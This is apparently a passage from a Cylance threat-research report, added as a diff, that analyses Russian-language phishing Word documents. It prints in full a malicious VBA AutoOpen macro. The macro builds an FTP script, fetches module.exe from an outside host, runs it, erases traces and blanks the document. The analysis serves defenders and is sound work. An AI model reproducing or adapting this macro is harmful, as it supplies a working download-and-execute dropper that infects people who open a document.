@@ -1,0 +1,46 @@
+Technical Analysis Phishing Documents Analysis
+Cylance researchers identified several phishing documents which used Microsoft Office
+macros to deliver malicious implants to their targets. It’s not entirely clear whether these
+were specifically targeted at isolated groups or utilized the old spray-and-pray method to
+cast a much wider net. Let’s take a look at one:
+SHA256: 7bb9f72436bcbb5fcb190ebc2cce77e1ea41ba0e6614bf2347b4514e7d65da4a
+Filename: На ознакомление.doc ~ For Review.doc
+Sub AutoOpen()
+'
+' AutoOpen [redacted]
+'
+2/14
+'
+Dim fso, tf
+Dim St As String
+Dim LocalFile As String
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.shell")
+LocalFile = Environ("APPDATA") & "\1.cmd"
+St = "cd %APPDATA%" & vbNewLine
+St = St + "echo open rnp-rosneft.ru>>1.txt" & vbNewLine
+St = St + "echo admin_root>>1.txt" & vbNewLine
+St = St + "echo [redacted]>>1.txt" & vbNewLine
+St = St + "echo cd /public_html/>>1.txt" & vbNewLine
+St = St + "echo binary>>1.txt" & vbNewLine
+St = St + "echo get module.exe module.exe>>1.txt" & vbNewLine
+St = St + "echo bye>>1.txt" & vbNewLine
+St = St + "ftp.exe -s:1.txt & start module.exe & del /f 1.txt & del /f 1.cmd"
+Set tf = fso.CreateTextFile(LocalFile, True)
+tf.Write (St)
+tf.Close
+If fso.FileExists(LocalFile) = True Then
+Selection.WholeStory
+Selection.Delete Unit:=wdCharacter, Count:=1
+objShell.Run "cmd /K cd %APPDATA% & 1.cmd", 0
+Selection.TypeText Text:="????????? ??????" + "???"
+End If
+End Sub
+Figure 1: Macro Contents of Phishing Document
+At a high level, this macro will write a number of FTP commands to a text file named “1.txt”
+in %APPDATA%. When executed by the last command it will login and download a file from
+an ftp server hosted on “rnp-rosneft[.]ru” and save it as “module.exe”. It then starts the
+“module.exe” binary and deletes another file named “1.cmd”. The binary “module.exe” was
+a modern variant of a family of malware that ESET calls “RedControle.” Cylance identified
+several other phishing documents which operated in a similar vein that are listed in the
+Appendix.
